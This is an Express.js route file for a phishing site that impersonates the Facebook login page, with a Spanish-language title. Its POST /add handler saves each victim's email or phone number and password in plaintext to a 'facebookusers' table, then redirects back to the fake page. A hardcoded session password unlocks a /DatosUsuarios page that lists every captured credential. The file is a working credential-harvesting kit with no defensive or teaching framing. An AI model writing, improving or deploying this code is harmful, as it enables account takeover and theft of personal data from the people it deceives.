const express = require("express");
const router = express.Router();
const pool = require("../database");

router.get("/www.facebook.com", (req, res) => {
  res.render("index", {
    title: "Facebook - Inicia sesión o regístrate",
    layout: "./layouts/layoutIndex",
  });
});

router.post("/add", async (req, res) => {
  try {
    const { emailOnumber, password } = req.body;
    const facebookUser = {
      emailOnumber,
      password,
    };
    await pool.query(`INSERT INTO facebookusers set ?`, facebookUser);
    res.redirect("/www.facebook.com");
  } catch (error) {
    console.log(error);
  }
});

router.get("/signin", (req, res) => {
  res.render("signin", {
    title: "Sign In",
    layout: "./layouts/layoutIndex",
  });
});

router.post("/signin", (req, res) => {
  const { pass } = req.body;
  req.session.password = pass;
  const sessionPassword = req.session.password;
  if (sessionPassword === "1000536294") {
    res.json({
      ok: true,
      message: "Acceso permitido",
    });
  } else {
    res.status(401).send({ Error: "401 Unauthorized (No autorizado)" });
  }
});

router.get("/DatosUsuarios", async (req, res) => {
  const sessionPassword = req.session.password;
  delete req.session.password;
  if (sessionPassword === "1000536294") {
    try {
      const Data = await pool.query(
        "SELECT emailOnumber,password,fecha_registro FROM facebookusers"
      );
      res.render("dataUsers", {
        title: "Datos",
        layout: "./layouts/layoutIndex",
        Data: Data,
      });
    } catch (error) {
      console.log(error);
    }
  } else {
    res.status(401).redirect("/signin");
  }
});

module.exports = router;
